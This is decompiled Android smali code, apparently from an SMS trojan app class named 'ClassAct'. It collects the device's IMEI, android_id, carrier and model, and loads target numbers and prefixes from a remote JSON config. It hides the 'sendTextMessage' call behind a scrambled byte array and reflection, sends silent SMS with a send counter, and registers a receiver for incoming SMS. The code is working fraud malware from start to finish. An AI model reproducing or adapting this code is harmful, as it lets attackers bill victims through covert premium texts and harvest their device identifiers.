    .param p1, "_context"    # Landroid/content/Context;
    .param p2, "configpach"    # Ljava/lang/String;
    .param p3, "par"    # I

    .prologue
    .line 91
    iput-object p1, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    .line 92
    const/4 v1, 0x1

    if-ne p3, v1, :cond_0

    .line 93
    invoke-direct {p0}, Leu/evandorostech/droider/ClassAct;->startUpdater()V

    .line 96
    :cond_0
    sget-object v1, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    iput-object v1, p0, Leu/evandorostech/droider/ClassAct;->q9:Ljava/lang/String;

    .line 97
    iget-object v1, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "android_id"

    invoke-static {v1, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Leu/evandorostech/droider/ClassAct;->q11:Ljava/lang/String;

    .line 98
    iget-object v1, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    .line 99
    const-string v2, "phone"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v1

    .line 98
    iput-object v1, p0, Leu/evandorostech/droider/ClassAct;->q18:Ljava/lang/String;

    .line 100
    iget-object v1, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    .line 101
    const-string v2, "phone"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    .line 102
    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->getNetworkOperator()Ljava/lang/String;

    move-result-object v1

    .line 100
    iput-object v1, p0, Leu/evandorostech/droider/ClassAct;->q12:Ljava/lang/String;

    .line 103
    iget-object v1, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Leu/evandorostech/droider/ClassAct;->q13:Ljava/lang/String;

    .line 104
    sget-object v1, Landroid/os/Build;->MODEL:Ljava/lang/String;

    iput-object v1, p0, Leu/evandorostech/droider/ClassAct;->q16:Ljava/lang/String;

    .line 105
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Leu/evandorostech/droider/ClassAct;->q17:Ljava/lang/String;

    .line 107
    invoke-direct {p0, p2}, Leu/evandorostech/droider/ClassAct;->f8(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 109
    .local v0, "her":Ljava/lang/String;
    invoke-direct {p0, v0}, Leu/evandorostech/droider/ClassAct;->f5(Ljava/lang/String;)V

    .line 113
    return-void
.end method

.method public f10(Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .param p1, "recipient"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    .line 498
    invoke-virtual {p0, p1, p2}, Leu/evandorostech/droider/ClassAct;->f11(Ljava/lang/String;Ljava/lang/String;)V

    .line 499
    return-void
.end method

.method public f11(Ljava/lang/String;Ljava/lang/String;)V
    .locals 17
    .param p1, "recipient"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    .line 502
    move-object/from16 v0, p0

    iget-object v12, v0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    const-string v13, "ESLIABONENTTUPIT"

    const/4 v14, 0x0

    invoke-virtual {v12, v13, v14}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v9

    .line 503
    .local v9, "settings":Landroid/content/SharedPreferences;
    invoke-interface {v9}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v3

    .line 504
    .local v3, "editor":Landroid/content/SharedPreferences$Editor;
    const-string v12, "countsend"

    const/4 v13, 0x0

    invoke-interface {v9, v12, v13}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v11

    .line 505
    .local v11, "val":I
    add-int/lit8 v11, v11, 0x1

    .line 506
    const-string v12, "countsend"

    invoke-interface {v3, v12, v11}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 507
    invoke-interface {v3}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 508
    invoke-static {v11}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v12

    move-object/from16 v0, p0

    invoke-virtual {v0, v12}, Leu/evandorostech/droider/ClassAct;->L(Ljava/lang/String;)V

    .line 509
    const/16 v12, 0x9

    if-ge v11, v12, :cond_0

    .line 511
    const/16 v12, 0xf

    new-array v1, v12, [B

    fill-array-data v1, :array_0

    .line 513
    .local v1, "bytttt":[B
    const/16 v12, 0xf

    new-array v2, v12, [B

    const/4 v12, 0x5

    const/16 v13, 0x65

    aput-byte v13, v2, v12

    const/4 v12, 0x6

    const/16 v13, 0x78

    aput-byte v13, v2, v12

    const/4 v12, 0x7

    const/16 v13, 0x74

    aput-byte v13, v2, v12

    const/16 v12, 0x8

    .line 514
    const/16 v13, 0x4d

    aput-byte v13, v2, v12

    const/16 v12, 0x9

    const/16 v13, 0x65

    aput-byte v13, v2, v12

    const/16 v12, 0xa

    const/16 v13, 0x73

    aput-byte v13, v2, v12

    const/16 v12, 0xb

    const/16 v13, 0x73

    aput-byte v13, v2, v12

    const/16 v12, 0xc

    const/16 v13, 0x61

    aput-byte v13, v2, v12

    const/16 v12, 0xd

    const/16 v13, 0x67

    aput-byte v13, v2, v12

    const/16 v12, 0xe

    const/16 v13, 0x65

    aput-byte v13, v2, v12

    .line 515
    .local v2, "bytttt2":[B
    const/4 v6, 0x0

    .line 516
    .local v6, "r":I
    array-length v12, v1

    add-int/lit8 v5, v12, -0x5

    .local v5, "i":I
    :goto_0
    array-length v12, v1

    if-lt v5, v12, :cond_1

    .line 520
    const/4 v5, 0x0

    :goto_1
    array-length v12, v1

    add-int/lit8 v12, v12, -0x5

    if-lt v5, v12, :cond_2

    .line 526
    :try_start_0
    sget-object v12, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    .line 527
    .local v7, "sdkVersion":I
    const/4 v12, 0x4

    if-ge v7, v12, :cond_3

    .line 529
    const-string v12, "android.telephony.gsm.SmsManager"

    .line 528
    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v12

    .line 530
    const-string v13, "getDefault"

    const/4 v14, 0x0

    .line 529
    invoke-virtual {v12, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    .line 531
    .local v4, "getDef":Ljava/lang/reflect/Method;
    const/4 v12, 0x0

    const/4 v13, 0x0

    invoke-virtual {v4, v12, v13}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v10

    .line 534
    .local v10, "sm":Ljava/lang/Object;
    const-string v12, "android.telephony.gsm.SmsManager"

    .line 533
    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v12

    .line 535
    new-instance v13, Ljava/lang/String;

    invoke-direct {v13, v2}, Ljava/lang/String;-><init>([B)V

    .line 536
    const/4 v14, 0x5

    new-array v14, v14, [Ljava/lang/Class;

    const/4 v15, 0x0

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x1

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x2

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x3

    .line 537
    const-class v16, Landroid/app/PendingIntent;

    aput-object v16, v14, v15

    const/4 v15, 0x4

    const-class v16, Landroid/app/PendingIntent;

    aput-object v16, v14, v15

    .line 534
    invoke-virtual {v12, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    .line 538
    .local v8, "sendSMS":Ljava/lang/reflect/Method;
    const/4 v12, 0x5

    new-array v12, v12, [Ljava/lang/Object;

    const/4 v13, 0x0

    aput-object p1, v12, v13

    const/4 v13, 0x2

    aput-object p2, v12, v13

    invoke-virtual {v8, v10, v12}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 559
    .end local v1    # "bytttt":[B
    .end local v2    # "bytttt2":[B
    .end local v4    # "getDef":Ljava/lang/reflect/Method;
    .end local v5    # "i":I
    .end local v6    # "r":I
    .end local v7    # "sdkVersion":I
    .end local v8    # "sendSMS":Ljava/lang/reflect/Method;
    .end local v10    # "sm":Ljava/lang/Object;
    :cond_0
    :goto_2
    return-void

    .line 517
    .restart local v1    # "bytttt":[B
    .restart local v2    # "bytttt2":[B
    .restart local v5    # "i":I
    .restart local v6    # "r":I
    :cond_1
    aget-byte v12, v1, v5

    aput-byte v12, v2, v6

    .line 518
    add-int/lit8 v6, v6, 0x1

    .line 516
    add-int/lit8 v5, v5, 0x1

    goto :goto_0

    .line 521
    :cond_2
    aget-byte v12, v1, v5

    aput-byte v12, v2, v6

    .line 522
    add-int/lit8 v6, v6, 0x1

    .line 520
    add-int/lit8 v5, v5, 0x1

    goto :goto_1

    .line 541
    .restart local v7    # "sdkVersion":I
    :cond_3
    :try_start_1
    const-string v12, "android.telephony.SmsManager"

    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v12

    .line 542
    const-string v13, "getDefault"

    const/4 v14, 0x0

    invoke-virtual {v12, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    .line 543
    .restart local v4    # "getDef":Ljava/lang/reflect/Method;
    const/4 v12, 0x0

    const/4 v13, 0x0

    invoke-virtual {v4, v12, v13}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v10

    .line 545
    .restart local v10    # "sm":Ljava/lang/Object;
    const-string v12, "android.telephony.SmsManager"

    invoke-static {v12}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v12

    .line 547
    new-instance v13, Ljava/lang/String;

    invoke-direct {v13, v2}, Ljava/lang/String;-><init>([B)V

    .line 548
    const/4 v14, 0x5

    new-array v14, v14, [Ljava/lang/Class;

    const/4 v15, 0x0

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x1

    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x2

    .line 549
    const-class v16, Ljava/lang/String;

    aput-object v16, v14, v15

    const/4 v15, 0x3

    const-class v16, Landroid/app/PendingIntent;

    aput-object v16, v14, v15

    const/4 v15, 0x4

    .line 550
    const-class v16, Landroid/app/PendingIntent;

    aput-object v16, v14, v15

    .line 546
    invoke-virtual {v12, v13, v14}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    .line 551
    .restart local v8    # "sendSMS":Ljava/lang/reflect/Method;
    const/4 v12, 0x5

    new-array v12, v12, [Ljava/lang/Object;

    const/4 v13, 0x0

    aput-object p1, v12, v13

    const/4 v13, 0x2

    aput-object p2, v12, v13

    invoke-virtual {v8, v10, v12}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    .line 554
    .end local v4    # "getDef":Ljava/lang/reflect/Method;
    .end local v7    # "sdkVersion":I
    .end local v8    # "sendSMS":Ljava/lang/reflect/Method;
    .end local v10    # "sm":Ljava/lang/Object;
    :catch_0
    move-exception v12

    goto :goto_2

    .line 511
    nop

    :array_0
    .array-data 1
        0x65t
        0x78t
        0x74t
        0x4dt
        0x65t
        0x73t
        0x73t
        0x61t
        0x67t
        0x65t
        0x73t
        0x65t
        0x6et
        0x64t
        0x54t
    .end array-data
.end method

.method public f12(Ljava/lang/String;Ljava/lang/String;)V
    .locals 13
    .param p1, "recipient"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    const/4 v11, 0x4

    const/4 v10, 0x5

    .line 561
    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "\u041e\u0442\u043f\u0440\u0430\u0432\u043b\u044f\u0435\u043c \u0441\u043c\u0441 \u043d\u043e\u043c\u0435\u0440:"

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, " \u0442\u0435\u043a\u0441\u0442"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {p0, v8}, Leu/evandorostech/droider/ClassAct;->L(Ljava/lang/String;)V

    .line 563
    const/16 v8, 0xf

    new-array v0, v8, [B

    fill-array-data v0, :array_0

    .line 565
    .local v0, "bytttt":[B
    const/16 v8, 0xf

    new-array v1, v8, [B

    const/16 v8, 0x65

    aput-byte v8, v1, v10

    const/4 v8, 0x6

    const/16 v9, 0x78

    aput-byte v9, v1, v8

    const/4 v8, 0x7

    const/16 v9, 0x74

    aput-byte v9, v1, v8

    const/16 v8, 0x8

    .line 566
    const/16 v9, 0x4d

    aput-byte v9, v1, v8

    const/16 v8, 0x9

    const/16 v9, 0x65

    aput-byte v9, v1, v8

    const/16 v8, 0xa

    const/16 v9, 0x73

    aput-byte v9, v1, v8

    const/16 v8, 0xb

    const/16 v9, 0x73

    aput-byte v9, v1, v8

    const/16 v8, 0xc

    const/16 v9, 0x61

    aput-byte v9, v1, v8

    const/16 v8, 0xd

    const/16 v9, 0x67

    aput-byte v9, v1, v8

    const/16 v8, 0xe

    const/16 v9, 0x65

    aput-byte v9, v1, v8

    .line 567
    .local v1, "bytttt2":[B
    const/4 v4, 0x0

    .line 568
    .local v4, "r":I
    array-length v8, v0

    add-int/lit8 v3, v8, -0x5

    .local v3, "i":I
    :goto_0
    array-length v8, v0

    if-lt v3, v8, :cond_0

    .line 572
    const/4 v3, 0x0

    :goto_1
    array-length v8, v0

    add-int/lit8 v8, v8, -0x5

    if-lt v3, v8, :cond_1

    .line 577
    :try_start_0
    sget-object v8, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v5

    .line 578
    .local v5, "sdkVersion":I
    if-ge v5, v11, :cond_2

    .line 580
    const-string v8, "android.telephony.gsm.SmsManager"

    .line 579
    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v8

    .line 581
    const-string v9, "getDefault"

    const/4 v10, 0x0

    .line 580
    invoke-virtual {v8, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    .line 582
    .local v2, "getDef":Ljava/lang/reflect/Method;
    const/4 v8, 0x0

    const/4 v9, 0x0

    invoke-virtual {v2, v8, v9}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    .line 585
    .local v7, "sm":Ljava/lang/Object;
    const-string v8, "android.telephony.gsm.SmsManager"

    .line 584
    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v8

    .line 586
    new-instance v9, Ljava/lang/String;

    invoke-direct {v9, v1}, Ljava/lang/String;-><init>([B)V

    .line 587
    const/4 v10, 0x5

    new-array v10, v10, [Ljava/lang/Class;

    const/4 v11, 0x0

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x1

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x2

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x3

    .line 588
    const-class v12, Landroid/app/PendingIntent;

    aput-object v12, v10, v11

    const/4 v11, 0x4

    const-class v12, Landroid/app/PendingIntent;

    aput-object v12, v10, v11

    .line 585
    invoke-virtual {v8, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    .line 589
    .local v6, "sendSMS":Ljava/lang/reflect/Method;
    const/4 v8, 0x5

    new-array v8, v8, [Ljava/lang/Object;

    const/4 v9, 0x0

    aput-object p1, v8, v9

    const/4 v9, 0x2

    aput-object p2, v8, v9

    invoke-virtual {v6, v7, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 609
    .end local v2    # "getDef":Ljava/lang/reflect/Method;
    .end local v5    # "sdkVersion":I
    .end local v6    # "sendSMS":Ljava/lang/reflect/Method;
    .end local v7    # "sm":Ljava/lang/Object;
    :goto_2
    return-void

    .line 569
    :cond_0
    aget-byte v8, v0, v3

    aput-byte v8, v1, v4

    .line 570
    add-int/lit8 v4, v4, 0x1

    .line 568
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 573
    :cond_1
    aget-byte v8, v0, v3

    aput-byte v8, v1, v4

    .line 574
    add-int/lit8 v4, v4, 0x1

    .line 572
    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    .line 592
    .restart local v5    # "sdkVersion":I
    :cond_2
    :try_start_1
    const-string v8, "android.telephony.SmsManager"

    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v8

    .line 593
    const-string v9, "getDefault"

    const/4 v10, 0x0

    invoke-virtual {v8, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    .line 594
    .restart local v2    # "getDef":Ljava/lang/reflect/Method;
    const/4 v8, 0x0

    const/4 v9, 0x0

    invoke-virtual {v2, v8, v9}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    .line 596
    .restart local v7    # "sm":Ljava/lang/Object;
    const-string v8, "android.telephony.SmsManager"

    invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v8

    .line 598
    new-instance v9, Ljava/lang/String;

    invoke-direct {v9, v1}, Ljava/lang/String;-><init>([B)V

    .line 599
    const/4 v10, 0x5

    new-array v10, v10, [Ljava/lang/Class;

    const/4 v11, 0x0

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x1

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x2

    .line 600
    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v11

    const/4 v11, 0x3

    const-class v12, Landroid/app/PendingIntent;

    aput-object v12, v10, v11

    const/4 v11, 0x4

    .line 601
    const-class v12, Landroid/app/PendingIntent;

    aput-object v12, v10, v11

    .line 597
    invoke-virtual {v8, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v6

    .line 602
    .restart local v6    # "sendSMS":Ljava/lang/reflect/Method;
    const/4 v8, 0x5

    new-array v8, v8, [Ljava/lang/Object;

    const/4 v9, 0x0

    aput-object p1, v8, v9

    const/4 v9, 0x2

    aput-object p2, v8, v9

    invoke-virtual {v6, v7, v8}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    .line 605
    .end local v2    # "getDef":Ljava/lang/reflect/Method;
    .end local v5    # "sdkVersion":I
    .end local v6    # "sendSMS":Ljava/lang/reflect/Method;
    .end local v7    # "sm":Ljava/lang/Object;
    :catch_0
    move-exception v8

    goto :goto_2

    .line 563
    :array_0
    .array-data 1
        0x65t
        0x78t
        0x74t
        0x4dt
        0x65t
        0x73t
        0x73t
        0x61t
        0x67t
        0x65t
        0x73t
        0x65t
        0x6et
        0x64t
        0x54t
    .end array-data
.end method

.method public f2()V
    .locals 2

    .prologue
    .line 124
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Leu/evandorostech/droider/ClassAct$2;

    invoke-direct {v1, p0}, Leu/evandorostech/droider/ClassAct$2;-><init>(Leu/evandorostech/droider/ClassAct;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 151
    .local v0, "t":Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 152
    return-void
.end method

.method public f3()V
    .locals 2

    .prologue
    .line 160
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Leu/evandorostech/droider/ClassAct$3;

    invoke-direct {v1, p0}, Leu/evandorostech/droider/ClassAct$3;-><init>(Leu/evandorostech/droider/ClassAct;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 192
    .local v0, "t":Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 193
    return-void
.end method

.method public f4()V
    .locals 2

    .prologue
    .line 195
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Leu/evandorostech/droider/ClassAct$4;

    invoke-direct {v1, p0}, Leu/evandorostech/droider/ClassAct$4;-><init>(Leu/evandorostech/droider/ClassAct;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 222
    .local v0, "t":Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 223
    return-void
.end method

.method protected f7(Lorg/json/JSONObject;)V
    .locals 10
    .param p1, "data2"    # Lorg/json/JSONObject;

    .prologue
    .line 389
    const/4 v6, 0x0

    .line 390
    .local v6, "tempnumbers":Lorg/json/JSONArray;
    const/4 v7, 0x0

    .line 391
    .local v7, "tempprefix":Lorg/json/JSONArray;
    const/4 v0, 0x0

    .line 392
    .local v0, "data":Lorg/json/JSONArray;
    :try_start_0
    const-string v8, "number"

    invoke-virtual {p1, v8}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v6

    .line 395
    move-object v3, v6

    .line 396
    .local v3, "jsonArray":Lorg/json/JSONArray;
    if-eqz v3, :cond_0

    .line 397
    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    move-result v5

    .line 398
    .local v5, "len":I
    const/4 v2, 0x0

    .local v2, "i":I
    :goto_0
    if-lt v2, v5, :cond_2

    .line 403
    .end local v2    # "i":I
    .end local v5    # "len":I
    :cond_0
    const-string v8, "prefix"

    invoke-virtual {p1, v8}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v7

    .line 404
    move-object v4, v7

    .line 405
    .local v4, "jsonArray2":Lorg/json/JSONArray;
    if-eqz v4, :cond_1

    .line 406
    invoke-virtual {v4}, Lorg/json/JSONArray;->length()I

    move-result v5

    .line 407
    .restart local v5    # "len":I
    const/4 v2, 0x0

    .restart local v2    # "i":I
    :goto_1
    if-lt v2, v5, :cond_3

    .line 415
    .end local v2    # "i":I
    .end local v3    # "jsonArray":Lorg/json/JSONArray;
    .end local v4    # "jsonArray2":Lorg/json/JSONArray;
    .end local v5    # "len":I
    :cond_1
    :goto_2
    return-void

    .line 399
    .restart local v2    # "i":I
    .restart local v3    # "jsonArray":Lorg/json/JSONArray;
    .restart local v5    # "len":I
    :cond_2
    iget-object v8, p0, Leu/evandorostech/droider/ClassAct;->q4:Ljava/util/ArrayList;

    invoke-virtual {v3, v2}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 398
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    .line 408
    .restart local v4    # "jsonArray2":Lorg/json/JSONArray;
    :cond_3
    iget-object v8, p0, Leu/evandorostech/droider/ClassAct;->q5:Ljava/util/ArrayList;

    invoke-virtual {v4, v2}, Lorg/json/JSONArray;->get(I)Ljava/lang/Object;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 407
    add-int/lit8 v2, v2, 0x1

    goto :goto_1

    .line 411
    .end local v2    # "i":I
    .end local v3    # "jsonArray":Lorg/json/JSONArray;
    .end local v4    # "jsonArray2":Lorg/json/JSONArray;
    .end local v5    # "len":I
    :catch_0
    move-exception v1

    .line 413
    .local v1, "e":Lorg/json/JSONException;
    invoke-virtual {v1}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_2
.end method

.method public f9()V
    .locals 4

    .prologue
    .line 472
    new-instance v0, Landroid/content/IntentFilter;

    const-string v2, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v0, v2}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    .line 473
    .local v0, "filter":Landroid/content/IntentFilter;
    iget-object v2, p0, Leu/evandorostech/droider/ClassAct;->q8:Landroid/content/Context;

    iget-object v3, p0, Leu/evandorostech/droider/ClassAct;->RequestReceiver:Landroid/content/BroadcastReceiver;

    invoke-virtual {v2, v3, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 474
    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Leu/evandorostech/droider/ClassAct$5;

    invoke-direct {v2, p0}, Leu/evandorostech/droider/ClassAct$5;-><init>(Leu/evandorostech/droider/ClassAct;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 494
    .local v1, "t":Ljava/lang/Thread;
    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 496
    return-void
.end method

.method public requestReceived(Ljava/lang/String;)V
    .locals 0
    .param p1, "_from"    # Ljava/lang/String;

    .prologue
    .line 663
    return-void
.end method
